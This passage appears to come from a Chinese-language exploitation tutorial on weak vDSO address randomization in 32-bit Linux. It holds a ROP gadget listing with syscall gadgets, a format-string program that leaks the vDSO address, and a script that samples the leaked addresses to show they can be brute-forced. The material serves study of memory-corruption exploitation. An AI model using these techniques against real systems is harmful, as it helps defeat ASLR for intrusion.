    0x0000106d : nop ; nop ; nop ; pop eax ; mov eax, 0x77 ; int 0x80
    0x0000104d : nop ; nop ; nop ; push ecx ; push edx ; push ebp ; mov ebp, esp ; sysenter
    0x0000106e : nop ; nop ; pop eax ; mov eax, 0x77 ; int 0x80
    0x0000104e : nop ; nop ; push ecx ; push edx ; push ebp ; mov ebp, esp ; sysenter
    0x0000106f : nop ; pop eax ; mov eax, 0x77 ; int 0x80
    0x0000104f : nop ; push ecx ; push edx ; push ebp ; mov ebp, esp ; sysenter
    0x0000103d : or al, 0x24 ; ret
    0x0000061f : or al, 0x41 ; ret 0x80e
    0x00001034 : or bl, byte ptr [ebx + 0x5d] ; ret
    0x000007e1 : or byte ptr [ebx + 0x5e5b14c4], al ; pop edi ; pop ebp ; ret
    0x00000716 : or byte ptr [ecx + 0x5eca89f0], cl ; pop edi ; pop ebp ; ret
    0x00001070 : pop eax ; mov eax, 0x77 ; int 0x80
    0x00001059 : pop ebp ; pop edx ; pop ecx ; ret
    0x0000071d : pop ebp ; ret
    0x00001035 : pop ebx ; pop ebp ; ret
    0x000007e5 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
    0x0000105b : pop ecx ; ret
    0x0000071c : pop edi ; pop ebp ; ret
    0x0000105a : pop edx ; pop ecx ; ret
    0x0000071b : pop esi ; pop edi ; pop ebp ; ret
    0x00000e43 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
    0x00000618 : push cs ; adc byte ptr [ebp + 0xec54704], al ; or al, 0x41 ; ret 0x80e
    0x0000061e : push cs ; or al, 0x41 ; ret 0x80e
    0x00001052 : push ebp ; mov ebp, esp ; sysenter
    0x0000073b : push ebx ; call 0x1047
    0x00001050 : push ecx ; push edx ; push ebp ; mov ebp, esp ; sysenter
    0x00000739 : push edi ; push esi ; push ebx ; call 0x1049
    0x00001051 : push edx ; push ebp ; mov ebp, esp ; sysenter
    0x0000073a : push esi ; push ebx ; call 0x1048
    0x000008c2 : push esi ; ret
    0x00000819 : rcr byte ptr [ebx + 0x5e], 0x5f ; pop ebp ; ret
    0x0000071e : ret
    0x00000804 : ret 0x450f
    0x000007b4 : ret 0x458b
    0x00000b77 : ret 0x5d8b
    0x00000ecf : ret 0x7d8b
    0x00000621 : ret 0x80e
    0x00000793 : ret 0xf631
    0x000008c8 : ret 2
    0x00000966 : rol dword ptr [ebx + 0x5e5b6cc4], cl ; pop edi ; pop ebp ; ret
    0x0000102e : ror byte ptr [ecx - 0x76fd8b38], cl ; or bl, byte ptr [ebx + 0x5d] ; ret
    0x00001041 : sbb al, 0x24 ; ret
    0x00001058 : sbb byte ptr [ebp + 0x5a], 0x59 ; ret
    0x00001140 : scasb al, byte ptr es:[edi] ; call 0x340ff6d3
    0x00000926 : shl dword ptr [eax], 0xf ; inc ebp ; ret 0x450f
    0x00001055 : sysenter
    0x0000061a : test dword ptr [edi + eax*2], eax ; lds ecx, ptr [esi] ; or al, 0x41 ; ret 0x80e
    0x00001145 : xor al, 0x89 ; int 0xf
    0x00001056 : xor al, 0xcd ; sbb byte ptr [ebp + 0x5a], 0x59 ; ret
    0x00000818 : xor eax, eax ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
    Unique gadgets found: 123
这里有123条，相比64为位的还是很多。
> 注意：不同内核，vdso会有差异。
## 利用思路
因为不同内核，vdso会有差异，所以如果我们能把vdso给读出来的，就能够直接进行利用。
### vdso的随机化特点
相比于栈和其他的ASLR，`vdso`的随机化非常的弱，对于32的系统来说，有1/256的概率命中，这正好可以作为我们的利用点。
vdso的地址存放：
    pwndbg> stack
    78:01e0│   0xffffcf20 —▸ 0xf7fd5050 (__kernel_vsyscall) ◂— push   ecx
    79:01e4│   0xffffcf24 ◂— 0x21 /* '!' */
    7a:01e8│   0xffffcf28 —▸ 0xf7fd4000 ◂— jg     0xf7fd4047
    7b:01ec│   0xffffcf2c ◂— 0x10
    7c:01f0│   0xffffcf30 ◂— 0xbfebfbff
    7d:01f4│   0xffffcf34 ◂— 0x6
    7e:01f8│   0xffffcf38 ◂— 0x1000
    7f:01fc│   0xffffcf3c ◂— 0x11
    pwndbg> vmmap
    LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
    0x56555000 0x56556000 r-xp     1000 0      /home/ex/test/vdso_addr
    0x56556000 0x56557000 r--p     1000 0      /home/ex/test/vdso_addr
    0x56557000 0x56558000 rw-p     1000 1000   /home/ex/test/vdso_addr
    0xf7dd6000 0xf7fab000 r-xp   1d5000 0      /lib/i386-linux-gnu/libc-2.27.so
    0xf7fab000 0xf7fac000 ---p     1000 1d5000 /lib/i386-linux-gnu/libc-2.27.so
    0xf7fac000 0xf7fae000 r--p     2000 1d5000 /lib/i386-linux-gnu/libc-2.27.so
    0xf7fae000 0xf7faf000 rw-p     1000 1d7000 /lib/i386-linux-gnu/libc-2.27.so
    0xf7faf000 0xf7fb2000 rw-p     3000 0      
    0xf7fcf000 0xf7fd1000 rw-p     2000 0      
    0xf7fd1000 0xf7fd4000 r--p     3000 0      [vvar]
    0xf7fd4000 0xf7fd6000 r-xp     2000 0      [vdso]
    0xf7fd6000 0xf7ffc000 r-xp    26000 0      /lib/i386-linux-gnu/ld-2.27.so
    0xf7ffc000 0xf7ffd000 r--p     1000 25000  /lib/i386-linux-gnu/ld-2.27.so
    0xf7ffd000 0xf7ffe000 rw-p     1000 26000  /lib/i386-linux-gnu/ld-2.27.so
    0xfffdc000 0xffffe000 rw-p    22000 0      [stack]
从上可以看出，栈上有一个地址是用来存放vdso的基地址的，但是这个地址的偏移总是汇编，所以我临时写了下面的代码进行打印查看。
    // compiled: gcc -g -m32 vdso_addr.c -o vdso_addr
    #include 
    #include 
    #include 
    int main()
    {
        printf("vdso addr: %124$p\n");
        return 0;
    }
> 注意偏移值会改变
然后用下面的脚本来查看结果：
    #!/usr/bin/python
    # -*- coding:utf-8 -*-    
    import os
    result = []
    for i in range(100):
        result += [os.popen('./vdso_addr').read()[:-1]]
    result = sorted(result)
    for v in result:
        print (v)
在比较新的内核的运行结果如下：
    ex@Ex:~/test$ python vdso_addr.py 
    vdso addr: 0xf7ed6000
    vdso addr: 0xf7ed8000
    vdso addr: 0xf7eda000
    vdso addr: 0xf7edd000
    vdso addr: 0xf7ee6000
    vdso addr: 0xf7ee6000
    vdso addr: 0xf7ee9000
    vdso addr: 0xf7ee9000
    vdso addr: 0xf7eee000
    vdso addr: 0xf7eef000
    vdso addr: 0xf7ef3000
    vdso addr: 0xf7ef7000
    vdso addr: 0xf7ef9000
    vdso addr: 0xf7efa000
    vdso addr: 0xf7efa000
    vdso addr: 0xf7efb000
    vdso addr: 0xf7efd000
    vdso addr: 0xf7efe000
    vdso addr: 0xf7f0e000
    vdso addr: 0xf7f14000
    vdso addr: 0xf7f1f000
    vdso addr: 0xf7f21000
    vdso addr: 0xf7f24000
    vdso addr: 0xf7f25000
    vdso addr: 0xf7f26000
    vdso addr: 0xf7f2a000
    vdso addr: 0xf7f2a000
    vdso addr: 0xf7f2b000
    vdso addr: 0xf7f34000
    vdso addr: 0xf7f36000
    vdso addr: 0xf7f39000
    vdso addr: 0xf7f3b000
    vdso addr: 0xf7f41000
    vdso addr: 0xf7f47000
    vdso addr: 0xf7f48000
    vdso addr: 0xf7f48000
    vdso addr: 0xf7f49000
    vdso addr: 0xf7f49000
    vdso addr: 0xf7f4a000
    vdso addr: 0xf7f4b000
    vdso addr: 0xf7f4d000
    vdso addr: 0xf7f4e000
    vdso addr: 0xf7f4e000
    vdso addr: 0xf7f4f000
    vdso addr: 0xf7f50000
    vdso addr: 0xf7f52000
    vdso addr: 0xf7f52000
    vdso addr: 0xf7f53000
    vdso addr: 0xf7f57000
    vdso addr: 0xf7f58000
    vdso addr: 0xf7f59000
    vdso addr: 0xf7f5a000
    vdso addr: 0xf7f5f000
    vdso addr: 0xf7f5f000
    vdso addr: 0xf7f60000
    vdso addr: 0xf7f64000
    vdso addr: 0xf7f68000
    vdso addr: 0xf7f6c000
    vdso addr: 0xf7f70000
    vdso addr: 0xf7f72000
    vdso addr: 0xf7f73000
    vdso addr: 0xf7f75000
    vdso addr: 0xf7f7e000
    vdso addr: 0xf7f7f000
    vdso addr: 0xf7f7f000
    vdso addr: 0xf7f80000
    vdso addr: 0xf7f88000
    vdso addr: 0xf7f88000
    vdso addr: 0xf7f8d000
    vdso addr: 0xf7f94000
    vdso addr: 0xf7f95000
    vdso addr: 0xf7f95000
    vdso addr: 0xf7f99000
    vdso addr: 0xf7f99000
    vdso addr: 0xf7f9d000